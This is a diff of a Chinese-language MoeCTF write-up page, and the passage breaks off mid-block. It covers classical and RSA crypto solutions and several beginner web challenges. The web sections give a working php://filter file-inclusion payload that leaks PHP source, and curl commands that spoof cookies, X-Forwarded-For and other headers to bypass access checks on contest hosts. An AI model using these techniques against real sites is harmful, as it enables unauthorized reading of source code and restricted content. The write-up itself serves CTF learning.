+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">6 3 2 4 1 5
+</span></span><span class="line"><span class="cl">W E A R E D
+</span></span><span class="line"><span class="cl">I S C O V E
+</span></span><span class="line"><span class="cl">R E D F L E
+</span></span><span class="line"><span class="cl">E A T O N C
+</span></span><span class="line"><span class="cl">E</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This results in the following ciphertext:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">EVLNA CDTES EAROF ODEEC WIREE</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To decipher it, the recipient has to work out the column lengths by dividing the message length by the key length. Then he can write the message out in columns again, then re-order the columns by reforming the key word.</p>
 <p>In a variation, the message is blocked into segments that are the key length long and to each segment the same permutation (given by the key) is applied. This is equivalent to a columnar transposition where the read-out is by rows instead of columns.</p>
 <p>Columnar transposition continued to be used for serious purposes as a component of more complex ciphers at least into the 1950s.</p></blockquote>
 <p>不过这题有很大的坑&hellip; 就是解密顺序和加密是反着来的.. 我之前搞了好久都搞不出来&hellip; 按照Wiki分组重排, 成功拿到<code>flag</code>.</p>
@@ -880,7 +1798,31 @@ E</code></pre><p>This results in the following ciphertext:</p>
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这道题我研究了好久&hellip; 最后在线分解大数找到p和q, 然后bing搜来的脚本修改一下跑一遍就过了&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">##coding=utf-8</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
@@ -899,7 +1841,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span><span class="line"><span class="cl"> <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
 </span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;private.pem&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">arsa</span><span class="o">.</span><span class="n">exportKey</span><span class="p">())</span>
-</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></div><p>拿到私钥之后, 随便用个什么方法, openssl也好, 在线解密也好, 反正就出来了.</p>
+</span></span><span class="line"><span class="cl"><span class="n">private</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到私钥之后, 随便用个什么方法, openssl也好, 在线解密也好, 反正就出来了.</p>
 <h3 class="heading-element" id="hill-cipher"><span>Hill Cipher</span>
  <a href="#hill-cipher" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -907,7 +1851,31 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </h3><p>这题我真的是写到地老天荒&hellip;</p>
 <p>拿到题之后先找了无数个网站发现解不了, 就自己研究了一下, 发现矩阵求逆然后和密文求点积, 于是我就打开微软的<code>Mathematics</code>算了一年得到了输出, 然后写一程序手动输入弄出<code>flag</code>&hellip;</p>
 <p>具体情况呢, 就是题目给了个矩阵密钥, 先求逆, 然后存下来和分好组的密文挨个求点积, 最后输出结果时, 把小数部分直接舍掉就行了, 然后输入下面的程序里开始查表.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
@@ -927,7 +1895,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 57 62 34 0 45 52 33 65
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 15 45 58 45 63 45 33 49
 </span></span></span><span class="line"><span class="cl"><span class="c1">// 58 26 1 57 16 29 2 64
-</span></span></span></code></pre></div><p><code>flag</code>: <code>moectf{L1n2ar_Alg2bRa_1S_so0O_D1ffiCuLt}</code></p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>flag</code>: <code>moectf{L1n2ar_Alg2bRa_1S_so0O_D1ffiCuLt}</code></p>
 <h2 class="heading-element" id="web"><span>Web</span>
  <a href="#web" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -943,11 +1913,22 @@ E</code></pre><p>This results in the following ciphertext:</p>
  </a>
 </h3><p>去网上找了个叫<code>HackBar</code>的东西, 然后就<code>post</code>了&hellip;</p>
 <p>不过后来用脚本的办法, 拓展性高一点:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10001/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span></span></span></code></pre></div><h3 class="heading-element" id="introducing-web"><span>Introducing Web</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 class="heading-element" id="introducing-web"><span>Introducing Web</span>
  <a href="#introducing-web" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
@@ -957,14 +1938,41 @@ E</code></pre><p>This results in the following ciphertext:</p>
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>打开网页, 保存到本地, 打开HTML, 把下面这句:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;key&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;14&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;只需要输入msc_1s_Gre@t即可获取flag&#34;</span><span class="p">&gt;</span></span></span></code></pre></div><p>里的<code>maxlength</code>改成15或者更大的数, 然后本地浏览器打开改好的html, 输入, 提交, 拿到<code>flag</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;key&#34;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&#34;14&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;只需要输入msc_1s_Gre@t即可获取flag&#34;</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>里的<code>maxlength</code>改成15或者更大的数, 然后本地浏览器打开改好的html, 输入, 提交, 拿到<code>flag</code>.</p>
 <h3 class="heading-element" id="procotol"><span>Procotol</span>
  <a href="#procotol" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>从php的官方文档里读了好久&hellip;然后拼出来这么一句:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://39.108.11.206:10003/?file=php://filter/read=convert.base64-encode/resource=./index.php</span></span></code></pre></div><p>浏览器打开后能看到一串<code>base64</code>串, 复制下来解码:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="cp">&lt;?php
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://39.108.11.206:10003/?file=php://filter/read=convert.base64-encode/resource=./index.php</span></span></code></pre></td></tr></table>
+</div>
+</div><p>浏览器打开后能看到一串<code>base64</code>串, 复制下来解码:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-HTML" data-lang="HTML"><span class="line"><span class="cl"><span class="cp">&lt;?php
 </span></span></span><span class="line"><span class="cl"><span class="cp">error_reporting(0);
 </span></span></span><span class="line"><span class="cl"><span class="cp">echo &#39;&lt;p&gt;the flag was put in the index.php, can you get it?&lt;/p&gt;&#39;;
 </span></span></span><span class="line"><span class="cl"><span class="cp">
@@ -972,7 +1980,9 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span></span><span class="line"><span class="cl"><span class="cp">$file=$_GET[&#39;file&#39;];
 </span></span></span><span class="line"><span class="cl"><span class="cp">include($file);
 </span></span></span><span class="line"><span class="cl"><span class="cp">//moectf{YoU_g0t_f1@g}
-</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span></span></span></code></pre></div><p>然后就拿到<code>flag</code>了&hellip;</p>
+</span></span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就拿到<code>flag</code>了&hellip;</p>
 <p>说来这种把源码换成<code>base64</code>再输出防止被执行的方法真骚啊..</p>
 <h3 class="heading-element" id="restrictions"><span>Restrictions</span>
  <a href="#restrictions" class="heading-mark">
@@ -1019,18 +2029,36 @@ E</code></pre><p>This results in the following ciphertext:</p>
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>小小学了下正则表达式, 然后改了一下之前post用的脚本:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
 </span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span><span class="s2">&#34;aflagdddd/6/:skey&#34;</span><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://39.108.11.206:10009/&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datas</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span></span></span></code></pre></div><p>成功通过.</p>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功通过.</p>
 <h3 class="heading-element" id="头"><span>头</span>
  <a href="#%e5%a4%b4" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>这题真的狠&hellip;算了要文明&hellip;</p>
 <p>用<code>curl</code>连试了好几次终于过了:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ curl --header &#34;Cookie: login=true&#34; --header &#34;User-Agent: PowerPC&#34; --header &#34;Accept: application/flag&#34; -v -i http://47.101.32.101:10010/</span></span></code></pre></div><p>就是按照网页的提示改HTTP请求头就好了.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">$ curl --header &#34;Cookie: login=true&#34; --header &#34;User-Agent: PowerPC&#34; --header &#34;Accept: application/flag&#34; -v -i http://47.101.32.101:10010/</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就是按照网页的提示改HTTP请求头就好了.</p>
 <p><code>flag</code>: <code>moectf{M0m_I_c4n_m0dify_HTTP_H3aders!}</code></p>
 <p>这个<code>flag</code>写的也让人很想吐槽&hellip;.</p>
 <h3 class="heading-element" id="stronger_php"><span>stronger_php</span>
@@ -1046,7 +2074,48 @@ E</code></pre><p>This results in the following ciphertext:</p>
  </a>
 </h3><p>我!!!!! 想杀人&hellip;</p>
 <p>先挂出来我的狗血历程🙃:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">## 上面省略2232行尝试的代码
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">## 上面省略2232行尝试的代码
 </span></span><span class="line"><span class="cl">rever@DS-10001-RX MINGW64 ~
 </span></span><span class="line"><span class="cl">$ curl --header &#34;Referer: www.xidian.edu.cn&#34; --header &#34;User-Agent: moectf_browser&#34; --header &#34;X-Forwarded-For: 127.0.0.1&#34; --header &#34;Cookie: xduer&#34; --header &#34;Accept: PHP&#34; --header &#34;Accept-Encoding: UTF-8&#34; --header &#34;Accept-Language: zh-CN&#34; -v -i http://39.108.11.206:10012/
 </span></span><span class="line"><span class="cl">* Trying 39.108.11.206...
@@ -1082,22 +2151,45 @@ E</code></pre><p>This results in the following ciphertext:</p>
 </span></span><span class="line"><span class="cl">Content-Type: text/html
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">First of all, you must come from XiDian University&lt;br&gt;Second, you have to use moectf_browser&lt;br&gt;Third, you have to visit from the localhost&lt;br&gt;Fourth, your identity must be xduer&lt;br&gt;Fifth, client can only accept PHP documents&lt;br&gt;Sixth, we only allow UTF-8 encoding&lt;br&gt;Finally, we are only allowed to use Chinese.&lt;br&gt;Congratulations on having a good understanding of HTTP HEADERS and finally getting flag:&lt;br&gt;moectf{Reward_y0u_For_per3everAnce}
-</span></span><span class="line"><span class="cl">* Connection #0 to host 39.108.11.206 left intact</span></span></code></pre></div><p>试到最后一步看见<code>flag</code>里的那个<code>perseverance</code>我当时就想从四楼跳下去&hellip;</p>
+</span></span><span class="line"><span class="cl">* Connection #0 to host 39.108.11.206 left intact</span></span></code></pre></td></tr></table>
+</div>
+</div><p>试到最后一步看见<code>flag</code>里的那个<code>perseverance</code>我当时就想从四楼跳下去&hellip;</p>
 <h3 class="heading-element" id="朝鲜人"><span>朝鲜人</span>
  <a href="#%e6%9c%9d%e9%b2%9c%e4%ba%ba" class="heading-mark">
  <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
 </h3><p>朝鲜人! wd**d, 我去哪儿找朝鲜dns啊QAQ</p>
 <p>必应了好久找到一个阿里云的EDNS-CLIENT-SUBNET的使用介绍, 在我的<code>Open SUSE Tumbleweed</code>中运行如下:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget ftp://ftp.isc.org/isc/bind9/9.9.3/bind-9.9.3.tar.gz
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget ftp://ftp.isc.org/isc/bind9/9.9.3/bind-9.9.3.tar.gz
 </span></span><span class="line"><span class="cl">$ tar xf bind-9.9.3.tar.gz
 </span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> bind-9.9.3
